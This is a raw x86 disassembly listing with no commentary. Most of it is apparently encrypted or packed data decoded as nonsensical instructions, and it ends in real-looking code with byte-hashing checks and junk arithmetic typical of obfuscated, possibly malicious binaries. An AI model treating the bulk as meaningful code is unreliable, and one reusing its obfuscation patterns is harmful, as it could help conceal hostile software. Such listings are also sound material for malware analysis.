  41b05a:	call   0xb896:0x943db851
  41b061:	icebp  
  41b062:	mov    eax,0x9445a154
  41b067:	inc    eax
  41b068:	sahf   
  41b069:	popf   
  41b06a:	jne    0x41b0c0
  41b06c:	out    0xc7,eax
  41b06e:	hlt    
  41b06f:	and    BYTE PTR [ecx+0x4f],ah
  41b072:	fcomip st,st(5)
  41b074:	ins    DWORD PTR es:[edi],dx
  41b075:	jnp    0x41b04c
  41b077:	jmp    0xc824:0x7a4750bd
  41b07e:	and    ecx,DWORD PTR [eax]
  41b080:	sbb    ah,ah
  41b082:	mov    esp,0xb51a4093
  41b087:	dec    edx
  41b088:	adc    al,0x4c
  41b08a:	call   0x5ab2393e
  41b08f:	push   es
  41b090:	retf   0xe571
  41b093:	(bad)  
  41b094:	(bad)  
  41b096:	test   DWORD PTR [ebp+0x7cc6fbd2],edx
  41b09c:	jne    0x41b0d9
  41b09e:	ins    BYTE PTR es:[edi],dx
  41b09f:	lods   al,BYTE PTR ds:[esi]
  41b0a0:	retf   
  41b0a1:	xor    eax,0xba6d5098
  41b0a6:	(bad)  [ebp-0x45bebd]
  41b0ac:	int3   
  41b0ad:	sti    
  41b0ae:	or     BYTE PTR [eax-0x5b473574],cl
  41b0b4:	js     0x41b114
  41b0b6:	inc    edx
  41b0b7:	mov    esi,0xe2eb69af
  41b0bc:	into   
  41b0bd:	sub    al,0xba
  41b0bf:	cs stos DWORD PTR es:[edi],eax
  41b0c1:	pushf  
  41b0c2:	sbb    eax,0xefb0191f
  41b0c7:	scas   eax,DWORD PTR es:[edi]
  41b0c8:	call   0x36e34a18
  41b0cd:	fcomp  QWORD PTR [edx+0x70e739c6]
  41b0d3:	pop    es
  41b0d4:	iret   
  41b0d5:	push   eax
  41b0d6:	xchg   edi,eax
  41b0d7:	in     eax,dx
  41b0d8:	into   
  41b0d9:	cmp    edi,DWORD PTR [edi-0x7cec0f93]
  41b0df:	test   BYTE PTR [edx],bl
  41b0e1:	addr16 loope 0x41b07c
  41b0e4:	inc    ebp
  41b0e5:	mov    bl,BYTE PTR [edi+0x5146642]
  41b0eb:	call   0xa069:0xd641640c
  41b0f2:	adc    al,0x84
  41b0f4:	outs   dx,BYTE PTR ds:[esi]
  41b0f5:	push   edx
  41b0f6:	xchg   esi,eax
  41b0f7:	dec    ebx
  41b0f8:	and    ch,BYTE PTR [edx+eax*4]
  41b0fb:	xor    BYTE PTR [edi+0x770172bf],al
  41b101:	cld    
  41b102:	rcr    DWORD PTR [eax-0x1d088edd],0xd2
  41b109:	pushfw 
  41b10b:	push   ebp
  41b10c:	ss ins BYTE PTR es:[edi],dx
  41b10e:	adc    BYTE PTR [ecx+0x60],cl
  41b111:	sub    BYTE PTR [esi+0x2c46aca3],0x9d
  41b118:	cwde   
  41b119:	xchg   ecx,eax
  41b11a:	mov    BYTE PTR [esi],bh
  41b11c:	or     DWORD PTR [edx+ebx*8],eax
  41b11f:	test   DWORD PTR [esi+0x20],esp
  41b122:	sbb    BYTE PTR [esi],bl
  41b124:	adc    al,0xf8
  41b126:	fstp   QWORD PTR [eax+0xd]
  41b129:	nop
  41b12a:	push   cs
  41b12b:	(bad)  
  41b12c:	das    
  41b12d:	ror    dx,0xea
  41b131:	add    al,bh
  41b133:	dec    edi
  41b134:	or     esp,DWORD PTR [ecx]
  41b136:	aas    
  41b137:	add    edi,edi
  41b139:	jg     0x41b175
  41b13b:	rcl    DWORD PTR [edi],0x59
  41b13e:	in     eax,dx
  41b13f:	loopne 0x41b1ab
  41b141:	jp     0x41b134
  41b143:	lods   eax,DWORD PTR ds:[esi]
  41b144:	cmp    eax,0x2938165c
  41b149:	mov    BYTE PTR [edx+ebx*2],dh
  41b14c:	mov    ebp,0x3356d6b2
  41b151:	jae    0x41b10c
  41b153:	add    BYTE PTR [eax+edi*8+0x36],0x6b
  41b158:	pusha  
  41b159:	call   0xba5e:0x1d246bc6
  41b160:	loope  0x41b108
  41b162:	hlt    
  41b163:	and    ebp,ebp
  41b165:	cmp    DWORD PTR [esi+0x25],0xdd22f4c7
  41b16c:	rcl    BYTE PTR [edi+0x4e],cl
  41b16f:	fist   WORD PTR [edi]
  41b171:	fdiv   st(5),st
  41b173:	fld    TBYTE PTR [edx+0x14]
  41b176:	adc    ecx,DWORD PTR [esp+edx*1+0x19]
  41b17a:	mov    ebp,0xce5256a4
  41b17f:	fs jl  0x41b16e
  41b182:	aad    0xf1
  41b184:	fild   WORD PTR [eax]
  41b186:	dec    edx
  41b187:	sub    al,0xcd
  41b189:	fs aam 0xb4
  41b18c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b18d:	sub    BYTE PTR ds:0x31bac097,cl
  41b193:	pop    esi
  41b194:	dec    edi
  41b195:	push   ecx
  41b196:	push   ecx
  41b197:	div    DWORD PTR [edx]
  41b199:	jmp    0x84075eb2
  41b19e:	xor    DWORD PTR [ebx-0x16e0b781],ecx
  41b1a4:	int    0x85
  41b1a6:	cdq    
  41b1a7:	int    0x3d
  41b1a9:	push   ecx
  41b1aa:	fst    QWORD PTR [eax-0xa9f9c00]
  41b1b0:	outs   dx,DWORD PTR ds:[esi]
  41b1b1:	repnz and ebp,ebp
  41b1b4:	jmp    0x41b142
  41b1b6:	fadd   st(6),st
  41b1b8:	mov    al,0x92
  41b1ba:	fisubr DWORD PTR [edx-0x7a]
  41b1bd:	vcomiss xmm0,DWORD PTR [edi+0x2d5eee6b]
  41b1c5:	mov    ebp,0xb8ae5b95
  41b1ca:	cs scas al,BYTE PTR es:[edi]
  41b1cc:	stos   DWORD PTR es:[edi],eax
  41b1cd:	out    dx,al
  41b1ce:	out    0x32,al
  41b1d0:	and    eax,0x622b3639
  41b1d5:	inc    esp
  41b1d6:	jo     0x41b21c
  41b1d8:	mov    ecx,0x9aedc493
  41b1dd:	imul   ecx,DWORD PTR [esi-0x54c8ddea],0xa9820fb2
  41b1e7:	rol    edx,0x20
  41b1ea:	inc    ebp
  41b1eb:	dec    ebp
  41b1ec:	mov    dl,0x4a
  41b1ee:	lock push cs
  41b1f0:	xlat   BYTE PTR ds:[ebx]
  41b1f1:	push   edi
  41b1f2:	rol    DWORD PTR [ecx+esi*8-0x2e],0x30
  41b1f7:	and    eax,0x363044b
  41b1fc:	bound  ebp,QWORD PTR [edx-0x74]
  41b1ff:	fbld   TBYTE PTR [ebx-0x11]
  41b202:	ffreep st(3)
  41b204:	out    0xae,al
  41b206:	add    cl,BYTE PTR [ecx+edi*4+0x37bee6cf]
  41b20d:	mov    cl,dh
  41b20f:	loopne 0x41b26a
  41b211:	mov    dl,0xfd
  41b213:	mov    ah,ch
  41b215:	nop
  41b216:	jne    0x41b19b
  41b218:	jmp    0x41b265
  41b21a:	sahf   
  41b21b:	scas   eax,DWORD PTR es:[edi]
  41b21c:	dec    edi
  41b21d:	sbb    eax,edi
  41b21f:	shl    DWORD PTR [edi+0x8],1
  41b222:	add    eax,esp
  41b224:	loop   0x41b295
  41b226:	or     BYTE PTR [esi-0x159e4465],bh
  41b22c:	(bad)  
  41b22d:	sub    DWORD PTR [ebx-0x22092ce3],esi
  41b233:	mov    ebx,0xc9bb9787
  41b238:	xchg   ecx,eax
  41b239:	not    DWORD PTR [ebx-0x2a2b98a3]
  41b23f:	sbb    esi,DWORD PTR [eax-0x7d7df6ef]
  41b245:	mov    ah,0xd4
  41b247:	push   cs
  41b248:	cmc    
  41b249:	mov    al,BYTE PTR [ecx+0x3829d764]
  41b24f:	add    edx,DWORD PTR [edi+0x67]
  41b252:	addr16 or ch,al
  41b255:	xchg   ecx,eax
  41b256:	sub    edi,DWORD PTR [eax]
  41b258:	pop    esi
  41b259:	(bad)  
  41b25a:	js     0x41b29d
  41b25c:	(bad)  
  41b25d:	hlt    
  41b25e:	scas   eax,DWORD PTR es:[edi]
  41b25f:	xor    dl,BYTE PTR [ebx-0xb02e99a]
  41b265:	fmul   DWORD PTR [edi+ebx*1]
  41b268:	xchg   ebx,eax
  41b269:	push   esp
  41b26a:	sbb    ebx,DWORD PTR [eax+0x27]
  41b26d:	adc    al,0x6e
  41b26f:	mov    cl,0x56
  41b271:	push   ebx
  41b272:	adc    edx,edi
  41b274:	mov    ecx,0xc1f07ab8
  41b279:	dec    esi
  41b27a:	pop    edx
  41b27b:	test   al,0x5f
  41b27d:	lock jmp 0x41b24d
  41b280:	stos   BYTE PTR es:[edi],al
  41b281:	push   cs
  41b282:	(bad)  
  41b283:	cdq    
  41b284:	(bad)  
  41b285:	xor    BYTE PTR [eax],dh
  41b287:	aas    
  41b288:	repz mov ds:0xd87ed970,al
  41b28e:	fs inc ebx
  41b290:	inc    ebp
  41b291:	push   ebp
  41b292:	mov    dl,0x96
  41b294:	mov    bl,0x82
  41b296:	xchg   DWORD PTR [ebp-0x7311c1f0],edx
  41b29c:	add    eax,0x447c5503
  41b2a1:	and    DWORD PTR ds:0x94e84c0f,esi
  41b2a7:	int3   
  41b2a8:	inc    ebx
  41b2a9:	or     esi,DWORD PTR [eax+edi*1-0x31f27a]
  41b2b0:	jg     0x41b241
  41b2b2:	iret   
  41b2b3:	xchg   ecx,eax
  41b2b4:	xchg   esi,eax
  41b2b5:	rcr    BYTE PTR es:[esi],cl
  41b2b8:	sbb    BYTE PTR [ebx+ebp*8-0x21],cl
  41b2bc:	jo     0x41b2f3
  41b2be:	mov    cl,0x70
  41b2c0:	adc    eax,0x14f7e431
  41b2c5:	int3   
  41b2c6:	sbb    edx,DWORD PTR [eax]
  41b2c8:	push   esi
  41b2c9:	adc    DWORD PTR [esi-0x12b2b62e],ebp
  41b2cf:	(bad)  [eax-0x6ed27694]
  41b2d5:	dec    esi
  41b2d6:	xor    BYTE PTR [ebp-0x3f495ddb],ch
  41b2dc:	sahf   
  41b2dd:	jmp    0x310c42f
  41b2e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2e3:	in     eax,0x10
  41b2e5:	inc    ebp
  41b2e6:	xlat   BYTE PTR ds:[ebx]
  41b2e7:	push   ss
  41b2e8:	fistp  WORD PTR [eax]
  41b2ea:	inc    eax
  41b2eb:	cmc    
  41b2ec:	pop    eax
  41b2ed:	mov    bl,0x71
  41b2ef:	xor    al,BYTE PTR [ebp-0x7f]
  41b2f2:	nop
  41b2f3:	xor    eax,0xa33a91ab
  41b2f8:	sub    al,0x98
  41b2fa:	xor    eax,0x594568eb
  41b2ff:	je     0x41b369
  41b301:	jge    0x41b307
  41b303:	imul   ebx,DWORD PTR [ebp-0x7767ed81],0xaed4b692
  41b30d:	push   0x8a3fd4f1
  41b312:	or     BYTE PTR [eax+0x49],ch
  41b315:	inc    ecx
  41b316:	fs jbe 0x41b32f
  41b319:	in     al,0xef
  41b31b:	mov    cl,0x27
  41b31d:	nop
  41b31e:	adc    DWORD PTR [ebp+0x536f857c],0xffffff95
  41b325:	aaa    
  41b326:	fwait
  41b327:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b328:	sbb    dl,dl
  41b32a:	sbb    BYTE PTR [eax+0x4b3ccc8f],0xe5
  41b331:	xchg   ebp,eax
  41b332:	jp     0x41b326
  41b334:	ins    BYTE PTR es:[edi],dx
  41b335:	jg     0x41b31b
  41b337:	or     ebx,DWORD PTR [edi+0x29]
  41b33a:	les    eax,FWORD PTR [edx+0x69]
  41b33d:	mov    ah,0x18
  41b33f:	ins    BYTE PTR es:[edi],dx
  41b340:	mov    bl,0xcb
  41b342:	mov    ds:0x1839dc3,al
  41b347:	rcl    BYTE PTR [ecx-0x43],0x22
  41b34b:	add    eax,0x784b7728
  41b350:	aaa    
  41b351:	add    ebp,edx
  41b353:	sbb    BYTE PTR [eax+0x60a36378],bh
  41b359:	cmp    DWORD PTR cs:[eax],esp
  41b35c:	push   ecx
  41b35d:	cmp    al,0x72
  41b35f:	idiv   BYTE PTR [edi]
  41b361:	sbb    eax,0x7c7fa2b6
  41b366:	add    al,0xb1
  41b368:	(bad)  
  41b369:	mov    bl,0xa
  41b36b:	pop    edx
  41b36c:	enter  0x7348,0x4a
  41b370:	ja     0x41b37d
  41b372:	inc    edx
  41b373:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b374:	mov    BYTE PTR [edi+0x61],dh
  41b377:	adc    al,0x9
  41b379:	mov    esp,0x4df1835f
  41b37e:	xor    BYTE PTR [eax],dh
  41b380:	cmp    BYTE PTR [ebp+0xd5676d1],dl
  41b386:	xchg   esi,eax
  41b387:	dec    ecx
  41b388:	popa   
  41b389:	add    al,0x94
  41b38b:	dec    esi
  41b38c:	mov    eax,ds:0x4ce295dd
  41b391:	sub    al,0xf7
  41b393:	lods   al,BYTE PTR ds:[esi]
  41b394:	cmp    edi,DWORD PTR ds:0x7391493e
  41b39a:	xchg   ebx,eax
  41b39b:	out    0xad,al
  41b39d:	cmp    bh,BYTE PTR [edx+0x2b]
  41b3a0:	pop    es
  41b3a1:	test   eax,0x95feaf94
  41b3a6:	leave  
  41b3a7:	sub    esi,ebx
  41b3a9:	addr16 mov bl,0x8
  41b3ac:	xchg   ebx,eax
  41b3ad:	(bad)  
  41b3ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3af:	ins    DWORD PTR es:[edi],dx
  41b3b0:	cdq    
  41b3b1:	imul   edx,DWORD PTR [eax+0x21],0x3a
  41b3b5:	pusha  
  41b3b6:	ss call 0x4043d507
  41b3bc:	sar    DWORD PTR [ebp+0x27dffbfa],cl
  41b3c2:	and    al,ch
  41b3c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3c5:	arpl   WORD PTR [ecx+0x324a0136],ax
  41b3cb:	(bad)  
  41b3cd:	cmp    al,0xac
  41b3cf:	icebp  
  41b3d0:	arpl   WORD PTR [ebp-0x70],bx
  41b3d3:	pop    edi
  41b3d4:	mov    ecx,0x7277573c
  41b3d9:	xchg   DWORD PTR ds:0x3c33fe93,ebx
  41b3df:	inc    eax
  41b3e0:	push   ds
  41b3e1:	mov    bl,0x41
  41b3e3:	add    ah,BYTE PTR [edx-0x52]
  41b3e6:	pop    esp
  41b3e7:	mov    cl,0x79
  41b3e9:	xor    BYTE PTR [ecx+0x31],bh
  41b3ec:	faddp  st(4),st
  41b3ee:	js     0x41b3f4
  41b3f0:	std    
  41b3f1:	imul   edx,esi,0xaa57f8a
  41b3f7:	daa    
  41b3f8:	out    0x65,eax
  41b3fa:	fs pop edx
  41b3fc:	bound  ebp,QWORD PTR [ecx+0x72ab386f]
  41b402:	inc    ebp
  41b403:	xor    bl,BYTE PTR [esi-0x6e]
  41b406:	and    ebp,esi
  41b408:	inc    eax
  41b409:	loope  0x41b486
  41b40b:	jnp    0x41b3ad
  41b40d:	in     eax,dx
  41b40e:	fld    st(5)
  41b410:	test   al,0xf0
  41b412:	dec    ebx
  41b413:	mov    bl,0x98
  41b415:	pop    es
  41b416:	imul   edx,DWORD PTR ds:0xbe55f993,0x4e47dc52
  41b420:	ret    
  41b421:	xchg   edi,eax
  41b422:	jg     0x41b495
  41b424:	mov    ecx,0x62882cd2
  41b429:	aas    
  41b42a:	fcmovb st,st(2)
  41b42c:	leave  
  41b42d:	fdiv   st(6),st
  41b42f:	addr16 inc edx
  41b431:	xor    BYTE PTR [esp+eiz*2],0xf7
  41b435:	jg     0x41b4b2
  41b437:	mul    edx
  41b439:	push   edx
  41b43a:	sbb    al,0xec
  41b43c:	cmp    BYTE PTR [ebx+0x48],ch
  41b43f:	fldenv [esi]
  41b441:	cmc    
  41b442:	and    DWORD PTR [ebx-0x49],0xffffffc1
  41b446:	stc    
  41b447:	dec    eax
  41b448:	xchg   ebp,ecx
  41b44a:	popa   
  41b44b:	repz lds edi,FWORD PTR [esi+edi*2-0x2dc79c17]
  41b453:	inc    edi
  41b454:	jp     0x41b493
  41b456:	mov    esi,DWORD PTR [eax-0x507dd48e]
  41b45c:	inc    ebx
  41b45d:	mov    ds:0xcc27be25,eax
  41b462:	mov    edx,0x48f2fb85
  41b467:	int3   
  41b468:	push   ss
  41b469:	aam    0x97
  41b46b:	daa    
  41b46c:	lods   eax,DWORD PTR ds:[esi]
  41b46d:	mov    ch,0x39
  41b46f:	neg    ch
  41b471:	and    esi,DWORD PTR [ebx+0x4cfe4c8f]
  41b477:	xor    edi,DWORD PTR es:[eax-0x21910858]
  41b47e:	sbb    ah,BYTE PTR [esi-0x5d]
  41b481:	loopne 0x41b467
  41b483:	lea    ecx,[edi]
  41b485:	sbb    al,0x43
  41b487:	lock rcr bl,0xe7
  41b48b:	push   cs
  41b48c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b48d:	aam    0xd2
  41b48f:	push   eax
  41b490:	dec    eax
  41b491:	mov    bl,ch
  41b493:	xchg   edx,eax
  41b494:	loopne 0x41b41d
  41b496:	push   0x2d
  41b498:	arpl   WORD PTR [ebp-0x4f077b97],di
  41b49e:	jmp    0x41b4e4
  41b4a0:	sub    edi,DWORD PTR [edi]
  41b4a2:	sub    BYTE PTR ds:0x8d5c5f89,0xe7
  41b4a9:	stc    
  41b4aa:	add    DWORD PTR [esi-0x30ad0e4e],ebx
  41b4b0:	dec    edi
  41b4b1:	mov    ch,0x6c
  41b4b3:	push   ds
  41b4b4:	inc    eax
  41b4b5:	sub    esp,DWORD PTR [esi]
  41b4b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4b8:	push   0x25
  41b4ba:	pop    ds
  41b4bb:	mov    dh,0x30
  41b4bd:	mov    esp,0x5fe6aac3
  41b4c2:	out    dx,al
  41b4c3:	xchg   ebp,eax
  41b4c4:	mov    bl,0x57
  41b4c6:	gs sbb edx,eax
  41b4c9:	sti    
  41b4ca:	call   0x8ce:0x7d8cbefa
  41b4d1:	ror    BYTE PTR [edi],0x6b
  41b4d4:	cli    
  41b4d5:	loopne 0x41b4ec
  41b4d7:	fstp   QWORD PTR [esi-0x11502708]
  41b4dd:	xchg   ecx,eax
  41b4de:	xor    al,0x55
  41b4e0:	aaa    
  41b4e1:	add    edx,DWORD PTR [esi-0x5e]
  41b4e4:	mov    cl,0x7
  41b4e6:	mov    DWORD PTR [esi+0x3a],esp
  41b4e9:	(bad)  
  41b4eb:	cmp    DWORD PTR [edi],ebx
  41b4ed:	adc    DWORD PTR [ecx-0x75],edi
  41b4f0:	sti    
  41b4f1:	sub    ecx,edi
  41b4f3:	sti    
  41b4f4:	stos   DWORD PTR es:[edi],eax
  41b4f5:	fnstsw WORD PTR [esi]
  41b4f7:	xor    edi,DWORD PTR [ebp+ecx*1-0xa]
  41b4fb:	scas   al,BYTE PTR es:[edi]
  41b4fc:	adc    DWORD PTR [edx],ebp
  41b4fe:	test   eax,0xe3f84353
  41b503:	pop    es
  41b504:	mov    al,ds:0xa9180ba8
  41b509:	mov    ebp,0xa5659b62
  41b50e:	mov    eax,ds:0x48567a8d
  41b513:	retf   0x1d50
  41b516:	mov    dl,0x6
  41b518:	stos   BYTE PTR es:[edi],al
  41b519:	les    ebx,FWORD PTR [ebp-0x4a]
  41b51c:	das    
  41b51d:	sbb    DWORD PTR [eax+0x17ac1bc7],0x59
  41b524:	jne    0x41b4cd
  41b526:	ins    BYTE PTR es:[edi],dx
  41b527:	xchg   ebx,eax
  41b528:	mov    es:0xb9739d51,eax
  41b52e:	pushf  
  41b52f:	cmp    DWORD PTR [edi-0x9],esp
  41b532:	not    DWORD PTR [edi]
  41b534:	or     esi,DWORD PTR [eax+ebp*2+0x5f92a1cb]
  41b53b:	daa    
  41b53c:	add    edx,ebp
  41b53e:	iret   
  41b53f:	test   BYTE PTR [ebx+0x3ee8af98],bl
  41b545:	stos   DWORD PTR es:[edi],eax
  41b546:	inc    edx
  41b547:	(bad)  
  41b548:	not    DWORD PTR [ecx-0x386e04bb]
  41b54e:	js     0x41b550
  41b550:	xor    al,0x53
  41b552:	out    dx,eax
  41b553:	lea    ecx,[eax+0x46bebd4f]
  41b559:	arpl   WORD PTR [ebx+0x4369e94c],bx
  41b55f:	inc    edi
  41b560:	sbb    ah,al
  41b562:	inc    ecx
  41b563:	dec    edi
  41b564:	mov    BYTE PTR [ecx+eiz*2],dl
  41b567:	mul    eax
  41b569:	cmp    edx,DWORD PTR [eax-0x63c44816]
  41b56f:	out    0xe5,al
  41b571:	sub    cl,dh
  41b573:	xor    bl,BYTE PTR [esi]
  41b575:	mov    ds:0xff598d82,al
  41b57a:	pop    ebx
  41b57b:	xchg   edx,eax
  41b57c:	es lahf 
  41b57e:	jbe    0x41b575
  41b580:	or     DWORD PTR [esp+esi*8],0x54
  41b584:	xlat   BYTE PTR ds:[ebx]
  41b585:	ins    DWORD PTR es:[edi],dx
  41b586:	ja     0x41b594
  41b588:	inc    ebx
  41b589:	dec    esp
  41b58a:	sbb    eax,0x3f17420e
  41b58f:	sbb    al,0x54
  41b591:	pop    ds
  41b592:	inc    esi
  41b593:	dec    esp
  41b594:	js     0x41b519
  41b596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b597:	es in  al,dx
  41b599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b59a:	xor    dh,BYTE PTR [edi]
  41b59c:	jo     0x41b5d6
  41b59e:	test   BYTE PTR [eax-0x4083e17f],dl
  41b5a4:	xchg   ecx,eax
  41b5a5:	pop    edi
  41b5a6:	dec    ebx
  41b5a7:	imul   ebx,DWORD PTR [ebx-0x6491bd6d],0xd
  41b5ae:	out    dx,eax
  41b5af:	add    BYTE PTR [esi+0x2b5bdf84],dl
  41b5b5:	nop
  41b5b6:	push   0x55
  41b5b8:	stos   BYTE PTR es:[edi],al
  41b5b9:	pop    esi
  41b5ba:	test   al,0x42
  41b5bc:	push   ss
  41b5bd:	jmp    0xffa1:0xf4c408ff
  41b5c4:	les    esp,FWORD PTR [ebx+eiz*1]
  41b5c7:	jge    0x41b5f3
  41b5c9:	add    esi,ebx
  41b5cb:	and    BYTE PTR [ebp-0x58],ch
  41b5ce:	not    ch
  41b5d0:	call   DWORD PTR [ebx]
  41b5d2:	(bad)  
  41b5d3:	cli    
  41b5d4:	xor    BYTE PTR [edi],0x6a
  41b5d7:	pop    ecx
  41b5d8:	int    0xa5
  41b5da:	xlat   BYTE PTR ds:[ebx]
  41b5db:	fdiv   QWORD PTR [edx+0x725517e3]
  41b5e1:	jns    0x41b592
  41b5e3:	rol    ch,cl
  41b5e5:	aas    
  41b5e6:	add    DWORD PTR [eax+0x7],edx
  41b5e9:	mov    cl,BYTE PTR ds:0x103894ea
  41b5ef:	push   esp
  41b5f0:	retf   0x7b24
  41b5f3:	popa   
  41b5f4:	push   es
  41b5f5:	scas   eax,DWORD PTR es:[edi]
  41b5f6:	and    edx,eax
  41b5f8:	(bad)  
  41b5f9:	xchg   esp,eax
  41b5fa:	addr16 shl esi,cl
  41b5fd:	ins    DWORD PTR es:[edi],dx
  41b5fe:	pmaxub mm6,QWORD PTR [eax+0x466fb67e]
  41b605:	scas   al,BYTE PTR es:[edi]
  41b606:	dec    ebx
  41b607:	mov    esi,0x32f10942
  41b60c:	(bad)  
  41b60d:	js     0x41b68a
  41b60f:	sub    al,0x9f
  41b611:	or     BYTE PTR [ebp-0x1e],cl
  41b614:	call   0x5133:0x35682e27
  41b61b:	fxch   st(7)
  41b61d:	push   edx
  41b61e:	test   BYTE PTR [ebp+0x7a],0xb5
  41b622:	shl    ebx,cl
  41b624:	fild   DWORD PTR [edx+0x2a9b4b81]
  41b62a:	lds    eax,FWORD PTR [eax]
  41b62c:	xchg   ecx,eax
  41b62d:	mov    ch,0xa
  41b62f:	xor    al,0x5f
  41b631:	inc    esp
  41b632:	jo     0x41b68a
  41b634:	sub    eax,0x4ee5dd22
  41b639:	mov    eax,ds:0x6f793f0
  41b63e:	retf   0xc392
  41b641:	nop
  41b642:	sbb    eax,0x9d56ce5c
  41b647:	mov    dh,0xd6
  41b649:	xchg   edi,eax
  41b64a:	sbb    DWORD PTR [edi],ebx
  41b64c:	clc    
  41b64d:	test   BYTE PTR [ecx+0x647c9869],ch
  41b653:	or     al,0x96
  41b655:	femms  
  41b657:	sub    dh,0xfc
  41b65a:	aam    0xc9
  41b65c:	loop   0x41b6c0
  41b65e:	or     ebx,edi
  41b660:	sbb    al,0x29
  41b662:	repnz or eax,0x36d676d3
  41b668:	nop
  41b669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b66a:	pop    ebp
  41b66b:	or     BYTE PTR [edx+0x36],ch
  41b66e:	daa    
  41b66f:	mov    es,WORD PTR [eax+0x28]
  41b672:	xchg   esp,eax
  41b673:	jb     0x41b675
  41b675:	imul   esi,DWORD PTR [ebp+0x7ba1c189],0x6fb9a64d
  41b67f:	data16 add ch,0xe9
  41b683:	xchg   edi,eax
  41b684:	mov    edi,0xcbbbbfb7
  41b689:	mov    eax,0x952304e4
  41b68e:	clc    
  41b68f:	lods   al,BYTE PTR ds:[esi]
  41b690:	or     BYTE PTR [ecx+0x63ced7d9],bl
  41b696:	lock xor al,0xdc
  41b699:	adc    esp,DWORD PTR [edi+eax*8-0x33]
  41b69d:	pop    esi
  41b69e:	les    edi,FWORD PTR [edx-0x49]
  41b6a1:	ja     0x41b6e7
  41b6a3:	xchg   edi,eax
  41b6a4:	scas   al,BYTE PTR es:[edi]
  41b6a5:	loopne 0x41b6e8
  41b6a7:	xchg   ebx,eax
  41b6a8:	add    bh,BYTE PTR [edi-0x5e9d48d]
  41b6ae:	jbe    0x41b634
  41b6b0:	and    bh,BYTE PTR [ebx+0x295ff27e]
  41b6b6:	retf   
  41b6b7:	fucomi st,st(3)
  41b6b9:	jns    0x41b6e2
  41b6bb:	loop   0x41b736
  41b6bd:	retf   0xcaf6
  41b6c0:	push   esi
  41b6c1:	pop    ebx
  41b6c2:	clc    
  41b6c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6c4:	mov    eax,0xcffa4816
  41b6c9:	mov    al,0x96
  41b6cb:	in     al,0x6a
  41b6cd:	mov    DWORD PTR [edi],ebx
  41b6cf:	les    edi,FWORD PTR [eax-0x15]
  41b6d2:	cmp    BYTE PTR ds:[ebp-0x7ba51b5c],bl
  41b6d9:	int    0xcf
  41b6db:	cmp    eax,0xff3d3433
  41b6e0:	fwait
  41b6e1:	mov    ebx,0xf4d91e63
  41b6e6:	out    0x27,al
  41b6e8:	loopne 0x41b6d8
  41b6ea:	jns    0x41b693
  41b6ec:	cmp    ch,0xd5
  41b6ef:	xchg   BYTE PTR [edi],dl
  41b6f1:	pop    esi
  41b6f2:	push   ebx
  41b6f3:	gs inc esi
  41b6f5:	iret   
  41b6f6:	rol    DWORD PTR [edx],0x6f
  41b6f9:	pop    esi
  41b6fa:	minps  xmm4,XMMWORD PTR [ebp+0x29f09faa]
  41b701:	mov    esp,0xe4539be8
  41b706:	cmp    eax,0x35f30d2
  41b70b:	iret   
  41b70c:	sbb    BYTE PTR [ecx+0xecc98a6],dl
  41b712:	xor    edx,DWORD PTR [ebx+0x30]
  41b715:	mov    bh,BYTE PTR [ebx+0x64]
  41b718:	jns    0x41b6f2
  41b71a:	(bad)  
  41b71b:	fst    st(5)
  41b71d:	pop    es
  41b71e:	out    dx,eax
  41b71f:	xchg   esi,eax
  41b720:	xchg   edi,eax
  41b721:	cwde   
  41b722:	iret   
  41b723:	pop    ecx
  41b724:	loope  0x41b79b
  41b726:	dec    edx
  41b727:	pop    es
  41b728:	add    eax,0xf3f31b80
  41b72d:	pushf  
  41b72e:	inc    ecx
  41b72f:	and    edi,ebp
  41b731:	jae    0x41b744
  41b733:	stos   DWORD PTR es:[edi],eax
  41b734:	jno    0x41b6be
  41b736:	mov    ecx,0x32577179
  41b73b:	mov    DWORD PTR [ebp-0x14],ecx
  41b73e:	mov    ecx,DWORD PTR [ebp-0x14]
  41b741:	mov    ecx,DWORD PTR [ecx+0xc]
  41b744:	movsx  cx,BYTE PTR [ecx+eax*1]
  41b749:	mov    edx,0x3b4b
  41b74e:	sub    cx,dx
  41b751:	mov    edx,0x8a85
  41b756:	xor    cx,dx
  41b759:	mov    edx,0x4f85
  41b75e:	cmp    cx,dx
  41b761:	jne    0x419376
  41b767:	mov    ecx,DWORD PTR ds:0x423ff2
  41b76d:	mov    ecx,DWORD PTR [ecx+0x198]
  41b773:	mov    DWORD PTR [ecx],eax
  41b775:	jmp    0x41b79b
  41b77a:	mov    ecx,DWORD PTR [ebp+0x18]
  41b77d:	cmp    ecx,0xf89c85b5
  41b783:	jne    0x41b79b
  41b789:	push   eax
  41b78a:	push   DWORD PTR [ebp+0x14]
  41b78d:	push   DWORD PTR [ebp+0x10]
  41b790:	push   DWORD PTR [ebp+0xc]
  41b793:	push   DWORD PTR [ebp+0x8]
  41b796:	call   0x416ab7
  41b79b:	pop    edi
  41b79c:	pop    esi
  41b79d:	leave  
  41b79e:	ret    0x14
  41b7a1:	push   ebp
  41b7a2:	mov    ebp,esp
  41b7a4:	sub    esp,0x48
  41b7a7:	push   ebx
  41b7a8:	movzx  eax,BYTE PTR ds:0x42901c
  41b7af:	sub    DWORD PTR ds:0x429010,eax
  41b7b5:	push   esi
  41b7b6:	adc    DWORD PTR ds:0x429000,0x3a05
  41b7c0:	push   edi
  41b7c1:	xor    edi,0x559a
  41b7c7:	xor    esi,esi
  41b7c9:	mov    DWORD PTR [ebp-0x20],esi
  41b7cc:	sub    eax,0x6d46
  41b7d1:	mov    eax,DWORD PTR [ebp-0xc]
  41b7d4:	push   0x5
  41b7d6:	and    DWORD PTR ds:0x42b010,0x0
  41b7e0:	mov    edi,DWORD PTR ds:0x42b010
  41b7e6:	inc    edi
  41b7e7:	mov    DWORD PTR ds:0x42b010,edi
  41b7ed:	cmp    DWORD PTR ds:0x42b010,0x1e
  41b7f4:	jne    0x41b80f
